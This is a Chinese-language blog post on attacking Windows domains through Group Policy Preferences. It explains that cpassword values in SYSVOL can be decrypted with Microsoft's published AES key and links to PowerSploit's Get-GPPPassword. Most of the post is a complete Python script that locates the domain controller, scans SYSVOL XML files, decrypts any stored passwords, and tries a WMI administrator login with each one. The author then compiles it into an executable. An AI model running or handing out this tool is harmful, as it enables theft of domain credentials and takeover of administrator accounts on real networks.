---
title: 【域渗透】Group Policy Preference
date: 2019-06-27 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。

---

## 所有的域组策略存储在：

```
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
```

SYSVOL是AD（活动目录）里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。

组策略中可被利用的地方:
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml

且域管理员在组策略中填入用户名密码，对应的*.xml就会包含cpassword属性，利用微软选择公开了该AES 256加密的私钥进行解密，地址如下：
https://msdn.microsoft.com/en-us/library/cc422924.aspx

参考Chris Campbell @obscuresec开源的powershell脚本:
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1

利用python实现，思路很简单，自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码，进行登录。

```
#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-
# author: c1y2m3

"""Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.
This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.
"""

from Crypto.Cipher import AES
from base64 import b64decode
import re
import subprocess
import os
import wmi

def aes(password):
    # Init the key
    # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
    key = """
    4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
    f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
    """.replace(" ","").replace("\n","").decode('hex')

    # Add padding to the base64 string and decode it
    # cpassword = "V0aIsi50dFzB+lzPJwFbsLcFWNkOhLTfR2pg9Z51/0s"
    password += "=" * ((4 - len(password) % 4) % 4)
    cpassword = b64decode(password)
    # Decrypt the password
    o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(cpassword)
    # Print it
    return o[:-ord(o[-1])].decode('utf16')

def unc():

    command = "net time /domain"
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    pout = (p.stdout.readlines())
    try:
        for c in pout:
            test = c.decode('cp936').encode('utf-8').strip()
            # test ="\\BDC.mercry.com 的当前时间是 2019/6/26 19:13:53"
            # test1 ="\\WIN-TL226LF48RT.corp.vk.local 的当前时间是 2019/6/26 19:13:53"
            dctime = re.findall(r'\\\w+.\w+.\w+.\w+\w+.\w+.',test)
            Path = dctime[0].replace("\\",'\\\\').strip()
            return Path
    except Exception as e:
        print e.message

def ipconfig():

    try:

        computer = unc().replace("\\","")
        spn_list = "ping -n 1 -w 5 {}".format(computer)
        ping = subprocess.Popen(spn_list, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                             stderr=subprocess.PIPE)
        result = ping.stdout.read().decode('cp936').encode('utf-8').strip()
        ip_list = []
        ip = re.findall(r'(?<![\.\d])(?:\d{1,3}\.){3}\d{1,3}(?![\.\d])', str(result), re.S)
        ip_list.append(ip[0])
        # 列表去重:通过set方法进行处理
        ipconf = list(set(ip_list))
        dc_ip = ip_list[0]
        return dc_ip

    except Exception:
        pass

def all_path(dirname):

    result = []
    for maindir, subdir, file_name_list in os.walk(dirname):
        # print("2:",subdir) #当前主目录下的所有目录
        # print("3:",file_name_list) #当前主目录下的所有文件
        for filename in file_name_list:
            apath = os.path.join(maindir, filename)
            result.append(apath)
    return result


def search():

    controller = ipconfig()
    dirs = all_path(unc()+ "\SYSVOL")
    # dirs = all_path("C:\Users\c1y2m3\Desktop\hackbar2.1.3-master")
    for dir in dirs:
        # switch = ["Groups.xml","Services.xml","Scheduledtasks.xml","Printers.xml","Drives.xml","DataSources.xml"]
        if dir.endswith('xml'):
            print "[*] Find the XML file:" + (dir)
        try:
            with open(dir,'r') as fr:
                Name = re.findall(r'cpassword=".*?"',fr.read())
                if Name:
                    print "[*]  Looking for keywords ..."
                    password = Name[0].lstrip('cpassword="').rstrip('"')
                    print """--------------------------------------------------------------------------------------------"""
                    print "[+] Find the password :" + str(Name)
                    paswords = aes(password)
                    print "[+] Successful decryption :" + paswords
                    print """--------------------------------------------------------------------------------------------"""
                    conn = wmi.WMI(computer=controller, user="administrator", password=paswords)
                    Group = conn.Win32_UserAccount()
                    if Group > 0:
                        print "[+] {} Login Sucessful ".format(controller)
                        exit()
                    else:
                        print "[+] 200 Login Error "
        except Exception as e:
            print e.message


if __name__ == '__main__':
    search()
```

使用Pyinstaller进行编译可执行文件，最终实现效果：

![img](https://www.yunzhijia.com/microblog/filesvr/5d14bbe6a3725939b79cff30)